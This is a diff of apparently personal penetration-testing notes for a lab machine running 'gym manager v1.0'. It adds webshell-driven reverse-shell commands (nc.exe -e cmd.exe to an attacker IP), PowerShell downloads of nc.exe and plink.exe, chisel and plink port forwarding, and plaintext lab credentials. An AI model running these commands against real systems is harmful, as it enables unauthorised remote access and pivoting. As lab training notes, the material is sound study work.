@@ -37,8 +37,9 @@ Nmap done: 1 IP address (1 host up) scanned in 1437.11 seconds
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="Exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601091960.01" ts_lastsave="1601093124.84" unique_id="4">
 			<rich_text></rich_text>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="gym manager v1.0" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601091978.22" ts_lastsave="1601098687.96" unique_id="5">
-				<rich_text>On the page </rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="gym manager v1.0" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1601091978.22" ts_lastsave="1602326389.36" unique_id="5">
+				<rich_text>
+launch sOn the page </rich_text>
 				<rich_text link="webs http://10.10.10.198:8080/contact.php">http://10.10.10.198:8080/contact.php</rich_text>
 				<rich_text> see CMS and version
 
@@ -53,7 +54,20 @@ python 48506.py </rich_text>
 
 
 launch serve: nc -lvvnp 1337
-initiate connect to server: 10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe 10.10.16.5 1337 -e cmd.exe</rich_text>
+initiate connect to server: 10.10.10.198:8080/upload/kamehameha.php?telepathy=nc.exe 10.10.16.5 1337 -e cmd.exe
+
+powershell -c curl </rich_text>
+				<rich_text link="webs http://10.10.*.*/nc.exe">http://10.10.16.2:8080/nc.exe</rich_text>
+				<rich_text> -O nc.exe
+powershell -c curl </rich_text>
+				<rich_text link="webs http://10.10.*.*/nc.exe">http://10.10.16.2:8080/plink.exe</rich_text>
+				<rich_text> -O plink.exe
+
+./chisel.exe client 10.10.16.2:8080 R:8888:127.0.0.1:8888
+
+
+plink.exe -l kali -pw kali 10.10.16.2 -R 8888:127.0.0.1:8888
+plink.exe -l root -pw toor 10.10.16.2 -R 8888:127.0.0.1:8888</rich_text>
 			</node>
 		</node>
 	</node>
